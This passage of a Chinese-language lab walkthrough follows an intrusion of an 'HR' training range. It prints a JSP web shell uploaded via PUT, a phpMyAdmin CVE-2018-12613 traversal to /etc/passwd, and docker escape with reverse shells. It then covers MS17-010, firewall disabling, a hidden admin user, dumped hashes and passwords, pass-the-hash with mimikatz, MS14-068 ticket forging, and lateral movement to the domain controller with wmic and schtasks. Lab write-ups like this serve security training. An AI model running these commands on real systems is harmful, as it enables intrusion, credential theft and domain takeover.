class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/1.jsp/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:2002<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>5<br><br><span class="language-haxe">&lt;%-- 使用时请删除此行, 连接密码: <span class="hljs-type">cmd --</span>%&gt;</span><br><span class="language-haxe">  &lt;%! <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CHILD</span> <span class="hljs-keyword"><span class="hljs-keyword">extends</span> <span class="hljs-type">ClassLoader</span></span></span>&#123; CHILD(ClassLoader c)&#123;<span class="hljs-keyword">super</span>(c);&#125; <span class="hljs-keyword">public</span> Class compilation(byte[] b)&#123; <span class="hljs-keyword">return</span></span><br><span class="language-haxe">    <span class="hljs-keyword">super</span>.defineClass(b, <span class="hljs-number">0</span>, b.length); &#125; &#125; <span class="hljs-keyword">public</span> byte[] printed(<span class="hljs-keyword">String</span> str) throws Exception &#123; Class base64; byte[]</span><br><span class="language-haxe">    value=<span class="hljs-literal">null</span>; <span class="hljs-keyword">try</span> &#123; base64=Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>); Object decoder=base64.<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>();</span><br><span class="language-haxe">    value=(byte[])decoder.getClass().getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[] &#123;<span class="hljs-keyword">String</span>.<span class="hljs-class"><span class="hljs-keyword">class</span> &#125;).<span class="hljs-title">invoke</span>(<span class="hljs-title">decoder</span>, <span class="hljs-title">new</span> <span class="hljs-title">Object</span>[]</span></span><br><span class="hljs-class"><span class="language-haxe">    </span>&#123; str &#125;); &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123; <span class="hljs-keyword">try</span> &#123; base64=Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>); Object</span><br><span class="language-haxe">    decoder=base64.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(base64, <span class="hljs-literal">null</span>);</span><br><span class="language-haxe">    value=(byte[])decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[] &#123; <span class="hljs-keyword">String</span>.<span class="hljs-class"><span class="hljs-keyword">class</span> &#125;).<span class="hljs-title">invoke</span>(<span class="hljs-title">decoder</span>, <span class="hljs-title">new</span> <span class="hljs-title">Object</span>[] </span>&#123;</span><br><span class="language-haxe">    str &#125;); &#125; <span class="hljs-keyword">catch</span> (Exception ee) &#123;&#125; &#125; <span class="hljs-keyword">return</span> value; &#125; %&gt;</span><br><span class="language-haxe">    &lt;% <span class="hljs-keyword">String</span> cls=request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>); <span class="hljs-keyword">if</span> (cls !=<span class="hljs-literal">null</span>) &#123; <span class="hljs-keyword">new</span><span class="hljs-type"></span></span><br><span class="language-haxe">      CHILD(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).compilation(printed(cls)).<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>().equals(<span class="hljs-keyword">new</span><span class="hljs-type"></span></span><br><span class="language-haxe">      Object[]&#123;request,response&#125;); &#125; %&gt;</span><br><span class="language-haxe"></span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220141649386.png" alt="image-20240220141649386"></p><p>使用蚁剑连接</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220141838686.png" alt="image-20240220141838686"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220142002980.png" alt="image-20240220142002980"></p></li><li><p>针对2003</p><p>使用xray 扫描一下</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220142402812.png" alt="image-20240220142402812"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?target=db_sql.php%<span class="hljs-number">253</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220142415888.png" alt="image-20240220142415888"></p><p>发现ssrf，这个就可以访问任意文件，尝试使用这个日志反弹shell</p><p>创建一个临时表</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220145946228.png" alt="image-20240220145946228"></p><p>查看是否开启慢日志记录功能</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%slow%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220150104814.png" alt="image-20240220150104814"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220150657811.png" alt="image-20240220150657811"></p><p>发现这个方式不太行</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220150812337.png" alt="image-20240220150812337"></p><p>通过版本搜索漏洞</p><p>发现CVE-2018-12613</p><blockquote><p><a href="https://blog.csdn.net/qq_45521281/article/details/105780497">phpMyAdmin 4.8.1后台文件包含漏洞（CVE-2018-12613）_phpmyadmin4.8.1漏洞-CSDN博客</a></p></blockquote><p>尝试利用</p><p>插入phpnifo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO rce(code) VALUES(&quot;&lt;?php phpinfo(); ?&gt;&quot;);<br></code></pre></td></tr></table></figure><p>查看phpinfo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ‘&lt;?php phpinfo() ?&gt;’<br></code></pre></td></tr></table></figure><p>查看cookie 值</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220152825162.png" alt="image-20240220152825162"></p><p>访问</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?target=db_datadict.php%<span class="hljs-number">253</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>phpStudy<span class="hljs-regexp">/PHPTutorial/</span>tmp<span class="hljs-regexp">/tmp/</span>sess_d57001799c2f03f16958890eb7fff4b1<br><br></code></pre></td></tr></table></figure><p>未能成功实现</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220154257905.png" alt="image-20240220154257905"></p><p>按道理这一步会执行这个代码</p></li></ol><h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><ol><li><p>ip 收集</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219173620934.png" alt="image-20240219173620934"></p><p>发现ifconfig 不行</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ip addr</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219173908310.png" alt="image-20240219173908310"></p><p>发现没192.168.79.161 的ip </p><p>正常的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219174931042.png" alt="image-20240219174931042"></p><p>可能是docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/1/cgroup<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219175133036.png" alt="image-20240219175133036"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219175251544.png" alt="image-20240219175251544"></p><p>发现这个是docker </p><p>尝试docker 逃逸</p><blockquote><p><a href="https://tsy244.github.io/2024/02/19/%E6%B8%97%E9%80%8F/docker%E9%80%83%E9%80%B8/">docker逃逸 - AU9U5T (tsy244.github.io)</a></p></blockquote><p>尝试使用s2 的shell 逃逸</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220182130456.png" alt="image-20240220182130456"></p><p>发现使用特权逃逸的方式失败</p><p>尝试使用tomcat 逃逸</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220181950321.png" alt="image-20240220181950321"></p><p>发现成功</p><p>kali 开启监听，用于接受定时任务反弹的shell </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220185019318.png" alt="image-20240220185019318"></p><p>反弹成功</p><p>下载payload 然后执行</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220191452955.png" alt="image-20240220191452955"></p><p>反弹成功<br>开启代理</p><p>终于开始信息收集了</p><p>查看ip 地址</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220194825593.png" alt="image-20240220194825593"></p></li><li><p>存活探测</p><p>发现还有一个 192.168.183.128 的地址  使用fscan </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220213928235.png" alt="image-20240220213928235"></p><p>代理确保开启成功但是扫不出东西，有点怪</p><p>尝试使用nmap</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span>  nmap -sP -Pn <span class="hljs-number">192.168.183.1</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>结果有点怪</p><p>发现kali 使用admin 的时候没有没有使用root，所以出现这个情况</p><p>尝试使用root 权限</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220222820111.png" alt="image-20240220222820111"></p><p>一下就过了，还有就是nmap 的不建议使用全端口扫描容易出问题</p><p>发现</p><blockquote><p>192.168.183.130</p><p>192.168.183.131</p></blockquote><p>都是存在的</p></li><li><p>端口扫描</p><p>192.168.183.130</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220230524037.png" alt="image-20240220230524037"></p><p>192.168.183.131</p></li></ol><h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><ol><li><p>尝试利用fscan 发现ms17_010</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220230610483.png" alt="image-20240220230610483"></p><p>192.168.183.131</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220230358605.png" alt="image-20240220230358605"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220231524587.png" alt="image-20240220231524587"></p><p>发现存在但是打不下来</p><p>打了好几次</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221093506313.png" alt="image-20240221093506313"></p><p>好几次之后，发现成功</p></li><li><p>迁移到一个域用户的进程</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221141115003.png" alt="image-20240221141115003"></p></li><li><p>关闭防火墙</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">NetSh Advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221154905398.png" alt="image-20240221154905398"></p></li><li><p>创建用户</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> <span class="hljs-keyword">admin</span>$ hackHACK123 /<span class="hljs-keyword">add</span> &amp;&amp; net localgroup administrators <span class="hljs-keyword">admin</span>$ /<span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221110842373.png" alt="image-20240221110842373"></p><p>账户密码不行</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221110927040.png" alt="image-20240221110927040"></p><p>成功</p></li><li><p>将win7 传给cs</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221094832427.png" alt="image-20240221094832427"></p><p>直接就是system 权限都不需要提权</p><p>传动失败</p></li><li><p>抓密码</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221095717036.png" alt="image-20240221095717036"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221141510896.png" alt="image-20240221141510896"></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">NTML   <span class="hljs-keyword">bc23b0b4d5bf5ff42bc61fb62e13886e</span><br><span class="hljs-keyword"></span>douser  Dotest123<br><br>douser        DEMO             <span class="hljs-keyword">bc23b0b4d5bf5ff42bc61fb62e13886e </span> c48096437367aad00ac2dc70552051cd84912a55<br><br></code></pre></td></tr></table></figure><p>猜测这个是域用户</p></li><li><p>IPC$ 横向移动</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">net <span class="hljs-keyword">use</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">183.130</span>\c<span class="hljs-variable">$ </span>/<span class="hljs-symbol">user:</span>douser <span class="hljs-string">&quot;Dotest123&quot;</span><br></code></pre></td></tr></table></figure><p>发现失败</p><p>这个用户权限应该不高</p></li><li><p>wmic 横向移动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic /node:192.168.183.130 /user:douser /password:Dotest123 process list brief<br></code></pre></td></tr></table></figure><p>失败，还是用户的问题</p></li><li><p>尝试PTH</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hashdump</span><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Administrator:<span class="hljs-number">500</span>:aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-number">31</span>d<span class="hljs-number">6</span>cfe<span class="hljs-number">0</span>d<span class="hljs-number">16</span>ae<span class="hljs-number">931</span>b<span class="hljs-number">73</span><span class="hljs-keyword">c</span><span class="hljs-number">59</span>d<span class="hljs-number">7e0</span><span class="hljs-keyword">c</span><span class="hljs-number">089</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>:::<br>Guest:<span class="hljs-number">501</span>:aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-number">31</span>d<span class="hljs-number">6</span>cfe<span class="hljs-number">0</span>d<span class="hljs-number">16</span>ae<span class="hljs-number">931</span>b<span class="hljs-number">73</span><span class="hljs-keyword">c</span><span class="hljs-number">59</span>d<span class="hljs-number">7e0</span><span class="hljs-keyword">c</span><span class="hljs-number">089</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>:::<br><span class="hljs-symbol">testclone:</span><span class="hljs-number">1001</span>:aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-number">8</span>d<span class="hljs-number">8e04036</span>d<span class="hljs-number">33</span>ed<span class="hljs-number">20</span>f<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>f<span class="hljs-number">6</span>ad<span class="hljs-number">77e28</span>bb<span class="hljs-number">7</span>:::<br><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221102305247.png" alt="image-20240221102305247"></p><p>失败</p><p>尝试使用mimikatz</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:douser /domain:192.168.183.130 /ntlm:bc23b0b4d5bf5ff42bc61fb62e13886e&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure></li><li><p>尝试开启3389</p></li></ol>   <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">wmic RDTOGGLE WHERE ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections <span class="hljs-number">1</span><br>REG <span class="hljs-keyword">ADD</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></code></pre></td></tr></table></figure><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221111417407.png" alt="image-20240221111417407">&#x3D;</p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221131928500.png" alt="image-20240221131928500"></p><p>   看到了mimikakz 应该是防止我们二次上传</p><p>   mimikakz 感觉获取的信息会比msf 里面的多一些，个人觉得</p>   <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>sekurlsa::logonpassword<br></code></pre></td></tr></table></figure><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221143614860.png" alt="image-20240221143614860"></p><p>   忘记设置log了，这个不太好复制</p>   <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">log</span> <span class="hljs-keyword">ret</span>.txt<br></code></pre></td></tr></table></figure><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221143916232.png" alt="image-20240221143916232"></p>   <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SID</span>:  S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">979886063</span>-<span class="hljs-number">1111900045</span>-<span class="hljs-number">1414766810</span>-<span class="hljs-number">1107</span><br></code></pre></td></tr></table></figure><p>   尝试使用sid + mimikatz 制作</p><p>   现在可以尝试使用MS14-068 制作凭证</p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221151759600.png" alt="image-20240221151759600"></p>   <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MS14</span>-<span class="hljs-number">068</span>.exe -u douser@DEMO.COM -s S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">979886063</span>-<span class="hljs-number">1111900045</span>-<span class="hljs-number">1414766810</span>-<span class="hljs-number">1107</span> -d <span class="hljs-number">192.168.183.130</span> -p Dotest123<br></code></pre></td></tr></table></figure><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221153843345.png" alt="image-20240221153843345"></p><p>   清楚票据</p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221154112172.png" alt="image-20240221154112172"></p><p>   将票据注入内存</p>   <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::ptc <span class="hljs-string">&quot;TGT_douser@DEMO.COM.ccache&quot;</span><br></code></pre></td></tr></table></figure><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221154323860.png" alt="image-20240221154323860"></p><p>   net use 传递文件</p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221155552743.png" alt="image-20240221155552743"></p><p>   制作一个payload</p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221160333290.png" alt="image-20240221160333290"></p><p>   重新开启远程桌面</p>   <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">proxychains rdesktop <span class="hljs-number">192.168</span><span class="hljs-number">.183</span><span class="hljs-number">.133</span> -r disk:wj=<span class="hljs-regexp">/home/</span>kali <br></code></pre></td></tr></table></figure><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221160533542.png" alt="image-20240221160533542"></p><p>   将这个传给域控</p>   <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">copy</span> w_bind_10669.exe \\WIN<span class="hljs-literal">-ENS2VR5TR3N</span>\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221161502528.png" alt="image-20240221161502528"></p><p>   wmic 横向移动</p>   <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /node:<span class="hljs-number">192.168</span><span class="hljs-number">.183</span><span class="hljs-number">.130</span> /<span class="hljs-keyword">user</span>:douser /<span class="hljs-keyword">password</span>:Dotest123 process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;cmd /c c:\\w_bind_10669.exe&quot;<br></code></pre></td></tr></table></figure><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221162432930.png" alt="image-20240221162432930"></p><p>   这个方式失败了</p><p>   尝试定时任务</p>   <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/S</span> WIN-ENS2VR5TR3N <span class="hljs-string">/TN</span> <span class="hljs-string">&quot;test&quot;</span> <span class="hljs-string">/TR</span> c:<span class="hljs-string">/w_bind_10669.exe</span> <span class="hljs-string">/SC</span> MINUTE <span class="hljs-string">/ST</span> 14<span class="hljs-function">:29</span> <span class="hljs-string">/ru</span> system <span class="hljs-string">/f</span><br>schtasks <span class="hljs-string">/run</span> <span class="hljs-string">/tn</span> test <span class="hljs-string">/s</span> WIN-ENS2VR5TR3N<br></code></pre></td></tr></table></figure><p>   先尝试关闭防火墙，不然一直反弹不行</p>   <figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pf">echo NetSh Advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off &gt;&gt; <span class="hljs-number">1</span>.bat<br>copy <span class="hljs-number">1</span>.bat \\WIN-ENS2VR5TR3N\c$<br></code></pre></td></tr></table></figure><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221165050569.png" alt="image-20240221165050569"></p><p>   开启一个定时任务关闭防火墙</p>   <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/S</span> WIN-ENS2VR5TR3N <span class="hljs-string">/TN</span> <span class="hljs-string">&quot;test1&quot;</span> <span class="hljs-string">/TR</span> c:<span class="hljs-string">/1.bat</span> <span class="hljs-string">/SC</span> ONCE <span class="hljs-string">/ST</span> 21<span class="hljs-function">:57</span> <span class="hljs-string">/ru</span> system <span class="hljs-string">/f</span><br>schtasks <span class="hljs-string">/run</span> <span class="hljs-string">/tn</span> task1 <span class="hljs-string">/s</span> WIN-ENS2VR5TR3N<br></code></pre></td></tr></table></figure><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221165301837.png" alt="image-20240221165301837"></p><p>   